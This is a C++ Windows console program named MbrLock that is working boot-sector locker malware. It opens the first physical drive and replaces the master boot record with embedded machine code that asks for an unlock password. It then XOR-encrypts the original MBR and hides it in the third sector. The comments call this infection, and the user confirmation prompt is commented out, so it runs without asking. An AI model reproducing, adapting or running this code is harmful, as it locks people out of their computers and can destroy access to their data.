// MbrLock.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
unsigned char lpBuffer[512] = {
	0x8C, 0xC8, 0x8E, 0xD8, 0x8E, 0xD0, 0x8E, 0xC0, 0xBC, 0x00, 0x01, 0x8D, 0x2E, 0xD0, 0x7C, 0xB9, 
	0x1D, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xB2, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xB8, 0x05, 
	0xA0, 0x00, 0x8E, 0xD8, 0x33, 0xC9, 0x33, 0xDB, 0x33, 0xC0, 0xCD, 0x16, 0x3C, 0x08, 0x74, 0x11, 
	0x3C, 0x0D, 0x74, 0x17, 0xB4, 0x02, 0x88, 0x07, 0x88, 0x67, 0x01, 0x83, 0xC3, 0x02, 0x41, 0xEB, 
	0xE7, 0x83, 0xEB, 0x02, 0x49, 0x33, 0xC0, 0x89, 0x07, 0xEB, 0xDD, 0x8C, 0xC8, 0x8E, 0xC0, 0x33, 
	0xDB, 0x8D, 0x36, 0xEF, 0x7C, 0x2E, 0x80, 0x36, 0xEE, 0x7C, 0xAB, 0x2E, 0x8A, 0x0E, 0xEE, 0x7C, 
	0xB5, 0x00, 0x3E, 0x8A, 0x07, 0x26, 0x8A, 0x24, 0x80, 0xF4, 0xAB, 0x3A, 0xC4, 0x75, 0x39, 0x83, 
	0xC3, 0x02, 0x46, 0xE2, 0xED, 0x33, 0xC0, 0xB8, 0x00, 0x7E, 0x8E, 0xC0, 0x33, 0xDB, 0xB4, 0x02, 
	0xB2, 0x80, 0xB0, 0x01, 0xB6, 0x00, 0xB5, 0x00, 0xB1, 0x03, 0xCD, 0x13, 0xB9, 0x00, 0x02, 0x26, 
	0x80, 0x37, 0xCD, 0x43, 0xE2, 0xF9, 0x33, 0xDB, 0xB2, 0x80, 0xB4, 0x03, 0xB0, 0x01, 0xB6, 0x00, 
	0xB5, 0x00, 0xB1, 0x01, 0xCD, 0x13, 0xEB, 0x20, 0x8C, 0xC8, 0x8E, 0xD8, 0x8E, 0xD0, 0x8E, 0xC0, 
	0xBC, 0x00, 0x01, 0x8D, 0x2E, 0xF8, 0x7C, 0xB9, 0x2D, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 
	0xB2, 0x00, 0xCD, 0x10, 0x33, 0xC0, 0xCD, 0x16, 0xB8, 0xFF, 0xFF, 0x50, 0x33, 0xC0, 0x50, 0xCB, 
	0x50, 0x6C, 0x65, 0x61, 0x73, 0x65, 0x20, 0x49, 0x6E, 0x70, 0x75, 0x74, 0x20, 0x55, 0x6E, 0x6C, 
	0x6F, 0x63, 0x6B, 0x20, 0x50, 0x61, 0x73, 0x73, 0x77, 0x6F, 0x72, 0x64, 0x3A, 0x00, 0xA2, 0x9A, 
	0x99, 0x98, 0x9F, 0x9E, 0x9D, 0x9C, 0x93, 0x92, 0x50, 0x61, 0x73, 0x73, 0x77, 0x6F, 0x72, 0x64, 
	0x20, 0x4E, 0x6F, 0x74, 0x20, 0x52, 0x69, 0x67, 0x68, 0x74, 0x21, 0x2C, 0x50, 0x72, 0x65, 0x73, 
	0x73, 0x20, 0x41, 0x6E, 0x79, 0x20, 0x4B, 0x65, 0x79, 0x20, 0x54, 0x6F, 0x20, 0x52, 0x65, 0x73, 
	0x74, 0x61, 0x72, 0x74, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
void WriteMbr()
{
	//_asm{int 3}
	
	DWORD dwSize = 512;
	BYTE Mbr_Key = 0xcd;
	int i;

	HANDLE hPhysicalDrive = CreateFile("\\\\.\\PHYSICALDRIVE0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | 	
		FILE_SHARE_WRITE, NULL, 
		OPEN_EXISTING, 0, NULL);
	if (hPhysicalDrive == INVALID_HANDLE_VALUE)
	{
		printf("Open Drive0 Failed!\n");
		return;
	}
	
	BYTE BootSector[512];//原始MBR
	DWORD NumberOfBytesRead;
	if (SetFilePointer(hPhysicalDrive, 0, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER ||
		!ReadFile(hPhysicalDrive, BootSector, 512, &NumberOfBytesRead, NULL) )
	{	
		printf("read mbr Failed!\n");
		CloseHandle(hPhysicalDrive);
		return;
	}
	BYTE backBootSector[512];
	memcpy(backBootSector,BootSector,512);
	
	if (memcmp(backBootSector,lpBuffer,440) == 0)
	{
		printf("Already infected!\n");

		CloseHandle(hPhysicalDrive);
		return;
	}
	memcpy(backBootSector,lpBuffer,512);
	
	
	SetFilePointer(hPhysicalDrive, 0, 0, FILE_BEGIN);//读文件的时候会移动指针，所以要设置下
	WriteFile(hPhysicalDrive,backBootSector,512,&NumberOfBytesRead,NULL);//MBR感染
	
	
	//备份原始MBR 到第3个扇区
	LARGE_INTEGER PositionFileTable;
	PositionFileTable.QuadPart = 2 * 512;
	NumberOfBytesRead=0;
    //加密mbr
	for (i=0;i<512;i++)
	{
		BootSector[i]^= Mbr_Key;
	}

	if (!SetFilePointerEx(hPhysicalDrive,PositionFileTable, NULL, FILE_BEGIN)  ||
		!WriteFile(hPhysicalDrive, BootSector, 512, &NumberOfBytesRead, NULL))
	{
		printf("write backup mbr Failed!\n");
		CloseHandle(hPhysicalDrive);
		return;
	}
	
	printf("Write originale mbr!\n");	
	
	
	CloseHandle(hPhysicalDrive);
	printf("Write MBR OK!\n");
	return;
}
//////////////////////////////////////////////////////////////////////////
unsigned char testmbr[512] = {
	0x33, 0xC0, 0x8E, 0xD0, 0xBC, 0x00, 0x7C, 0x8E, 0xC0, 0x8E, 0xD8, 0xBE, 0x00, 0x7C, 0xBF, 0x00, 
	0x06, 0xB9, 0x00, 0x02, 0xFC, 0xF3, 0xA4, 0x50, 0x68, 0x1C, 0x06, 0xCB, 0xFB, 0xB9, 0x04, 0x00, 
	0xBD, 0xBE, 0x07, 0x80, 0x7E, 0x00, 0x00, 0xE9, 0xCA, 0x00, 0x85, 0x0E, 0x01, 0x83, 0xC5, 0x10, 
	0xE2, 0xF1, 0xCD, 0x18, 0x88, 0x56, 0x00, 0x55, 0xC6, 0x46, 0x11, 0x05, 0xC6, 0x46, 0x10, 0x00, 
	0xB4, 0x41, 0xBB, 0xAA, 0x55, 0xCD, 0x13, 0x5D, 0x72, 0x0F, 0x81, 0xFB, 0x55, 0xAA, 0x75, 0x09, 
	0xF7, 0xC1, 0x01, 0x00, 0x74, 0x03, 0xFE, 0x46, 0x10, 0x66, 0x60, 0x80, 0x7E, 0x10, 0x00, 0x74, 
	0x26, 0x66, 0x68, 0x00, 0x00, 0x00, 0x00, 0x66, 0xFF, 0x76, 0x08, 0x68, 0x00, 0x00, 0x68, 0x00, 
	0x7C, 0x68, 0x01, 0x00, 0x68, 0x10, 0x00, 0xB4, 0x42, 0x8A, 0x56, 0x00, 0x8B, 0xF4, 0xCD, 0x13, 
	0x9F, 0x83, 0xC4, 0x10, 0x9E, 0xEB, 0x14, 0xB8, 0x01, 0x02, 0xBB, 0x00, 0x7C, 0x8A, 0x56, 0x00, 
	0x8A, 0x76, 0x01, 0x8A, 0x4E, 0x02, 0x8A, 0x6E, 0x03, 0xCD, 0x13, 0x66, 0x61, 0x73, 0x1C, 0xFE, 
	0x4E, 0x11, 0x75, 0x0C, 0x80, 0x7E, 0x00, 0x80, 0x0F, 0x84, 0x8A, 0x00, 0xB2, 0x80, 0xEB, 0x84, 
	0x55, 0x30, 0xE4, 0x8A, 0x56, 0x00, 0xCD, 0x13, 0x5D, 0xEB, 0x9E, 0x81, 0x3E, 0xFE, 0x7D, 0x55, 
	0xAA, 0x75, 0x21, 0xFF, 0x76, 0x00, 0xE8, 0x8D, 0x00, 0x75, 0x5C, 0xFA, 0xB0, 0xD1, 0xE6, 0x64, 
	0xE8, 0x83, 0x00, 0xB0, 0xDF, 0xE6, 0x60, 0xE8, 0x7C, 0x00, 0xB0, 0xFF, 0xE6, 0x64, 0xE8, 0x75, 
	0x00, 0xFB, 0xEB, 0x43, 0xBE, 0x00, 0x06, 0x8B, 0x2C, 0x85, 0xED, 0x74, 0x44, 0xC7, 0x04, 0x00, 
	0x00, 0xE9, 0x40, 0xFF, 0x7C, 0x02, 0x75, 0x43, 0xBE, 0x00, 0x06, 0x89, 0x2C, 0xBD, 0x03, 0x07, 
	0xE9, 0x31, 0xFF, 0x80, 0x01, 0x01, 0x00, 0x0C, 0xFE, 0xFF, 0xFF, 0x36, 0xE4, 0x3F, 0x01, 0x00, 
	0x04, 0x00, 0x00, 0x66, 0x68, 0x00, 0xA0, 0xB8, 0x70, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 
	0x61, 0x68, 0x00, 0x00, 0x07, 0xCD, 0x1A, 0x5A, 0x32, 0xF6, 0xEA, 0x00, 0x7C, 0x00, 0x00, 0xCD, 
	0x18, 0xA0, 0xB7, 0x07, 0xEB, 0x08, 0xA0, 0xB6, 0x07, 0xEB, 0x03, 0xA0, 0xB5, 0x07, 0x32, 0xE4, 
	0x05, 0x00, 0x07, 0x8B, 0xF0, 0xAC, 0x3C, 0x00, 0x74, 0x09, 0xBB, 0x07, 0x00, 0xB4, 0x0E, 0xCD, 
	0x10, 0x74, 0xF2, 0xF4, 0xEB, 0xFD, 0x2B, 0xC9, 0xE4, 0x64, 0xEB, 0x00, 0x24, 0x02, 0xE0, 0xF8, 
	0x24, 0x02, 0xC3, 0x49, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x50, 0x61, 0x72, 0x74, 0x69, 
	0x74, 0x69, 0x6F, 0x6E, 0x20, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x00, 0x45, 0x72, 0x72, 0x6F, 0x72, 
	0x20, 0x6C, 0x6F, 0x61, 0x64, 0x69, 0x6E, 0x67, 0x20, 0x6F, 0x70, 0x65, 0x72, 0x61, 0x74, 0x69, 
	0x6E, 0x67, 0x20, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x00, 0x4D, 0x69, 0x73, 0x73, 0x69, 0x6E, 
	0x67, 0x20, 0x6F, 0x70, 0x65, 0x72, 0x61, 0x74, 0x69, 0x6E, 0x67, 0x20, 0x73, 0x79, 0x73, 0x74, 
	0x65, 0x6D, 0x00, 0x00, 0x00, 0x63, 0x7B, 0x9A, 0xEE, 0xB5, 0x43, 0xA7, 0xF4, 0x50, 0x80, 0x01, 
	0x01, 0x00, 0x07, 0xFE, 0xFF, 0xFF, 0x3F, 0x00, 0x00, 0x00, 0xD9, 0xA6, 0x3F, 0x01, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

void test()
{
	char var[10];
	int len = 9;
	int i;
	strcpy(var,"123456789");
	for (i=0;i<9;i++)
	{
		var[i]^= 0xab;
		printf("%8x ",var[i]);
	}
	len^=0xab;
	printf("\n%x\n",len);
	//BYTE Mbr_Key = 0xcd;
	//int i;
	//HANDLE hFile; 
	//DWORD dwResult;
	//CHAR file[] = "c:\\testmbr.bin";
	//hFile = CreateFile(file,                // name of the write
	//	GENERIC_WRITE,          // open for writing
	//	0,                      // do not share
	//	NULL,                   // default security
	//	CREATE_ALWAYS,          // overwrite existing
	//	FILE_ATTRIBUTE_NORMAL,  // normal file
	//	NULL);                  // no attr. template
	//if (hFile != INVALID_HANDLE_VALUE) 
	//{
	//	for (i=0;i<512;i++)
	//	{
	//		testmbr[i]^= Mbr_Key;
	//	}
	//	WriteFile (hFile, testmbr, 512, &dwResult, NULL);
	//	CloseHandle(hFile);
	//}

}
//////////////////////////////////////////////////////////////////////////
int main(int argc, char* argv[])
{
    //test();
	/*if (IDOK != MessageBox(NULL,_T("是否锁住硬盘执行！"),_T("锁住硬盘"),MB_OKCANCEL|MB_SYSTEMMODAL))
	{
		return 0;
	}*/
	WriteMbr();
	return 0;
}

